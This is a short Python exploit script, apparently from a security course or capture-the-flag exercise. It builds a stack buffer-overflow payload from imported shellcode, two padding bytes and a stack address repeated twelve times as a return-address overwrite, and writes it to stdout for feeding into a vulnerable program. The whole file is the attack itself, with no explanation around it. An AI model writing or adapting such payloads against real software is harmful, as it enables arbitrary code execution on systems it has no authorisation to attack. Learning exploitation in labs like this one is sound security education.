#!/usr/bin/env python3

import sys

from shellcode import shellcode

sys.stdout.buffer.write(shellcode)
sys.stdout.buffer.write(b'A'*2)
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))
sys.stdout.buffer.write(0x7ffffff6adb0.to_bytes(8, 'little'))








